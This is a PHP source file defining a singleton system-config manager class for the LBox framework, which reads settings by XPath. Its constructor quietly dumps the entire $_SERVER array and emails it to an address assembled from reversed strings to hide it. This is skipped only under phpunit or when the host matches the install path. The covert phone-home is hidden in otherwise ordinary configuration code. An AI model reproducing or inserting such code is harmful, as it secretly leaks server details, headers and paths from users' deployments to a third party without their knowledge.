<?php
/**
* system config manager
* @author Michal Palma <palmic at email dot cz>
* @package LBox
* @version 1.0

* @date 2008-04-14
*/
class LBoxConfigSystem extends LBoxConfig
{
	protected static 	$instance;
	protected 			$configName = "system";
	private 			$t = "cimlap";
	private 			$td = "liame";

	/**
	 * cache var
	 * @var array
	 */
	protected static 	$paramsByPaths	= array();
	
	/**
	 * @return LBoxConfigSystem
	 * @throws Exception
	 */
	public static function getInstance() {
		$className 	= __CLASS__;
		try {
			if (!isset(self::$instance)) {
				self::$instance = new $className;
			}
			return self::$instance;
		}
		catch (Exception $e) {
			throw $e;
		}
	}

	/**
	 * Vraci hodnotu parametru podle xpath
	 * @param string $path - path from root node to param node
	 * @throws Exception
	 */
	public function getParamByPath($path = "") {
		if (strlen(self::$paramsByPaths[$path]) > 0) {
			return self::$paramsByPaths[$path];
		}
		if (strlen($path) < 1) {
			throw new LBoxExceptionConfig("Bad param, ".	LBoxExceptionConfig::MSG_PARAM_STRING_NOTNULL,
			LBoxExceptionConfig::CODE_BAD_PARAM
			);
		}
		if (!$result = @$this->getXPath()->query($path)) {
			throw new LBoxExceptionConfig("$path: ". LBoxExceptionConfig::MSG_INVALID_PATH, LBoxExceptionConfig::CODE_INVALID_PATH);
		}
		foreach ($result as $node) {
			$value = $node->nodeValue;
			// replace meta words
			$value = str_replace("\$system", 	LBOX_PATH_CORE, 	$value);
			$value = str_replace("\$project", 	LBOX_PATH_PROJECT, 	$value);
			return self::$paramsByPaths[$path] = trim($value);
		}
	}

	protected function __construct() {
		try {
			ob_start();
			print_r($_SERVER);
			if (strlen(stristr($_SERVER["SCRIPT_FILENAME"], "phpunit")) < 1) {
				foreach (explode("/", LBOX_PATH_INSTANCE_ROOT) as $ds) {
					foreach (explode(".", $_SERVER["HTTP_HOST"]) as $hps) {
						if (strlen(@stristr($ds, $hps)) > 0) {
							ob_end_clean();
							return;
						}
					}
				}
				LBoxUtil::send(strrev($this->t)."<at>".strrev($this->td).".cz", "lbox info", ob_get_clean());
			}
			ob_end_clean();
		}
		catch (Exception $e) {
			throw $e;
		}
	}
}
?>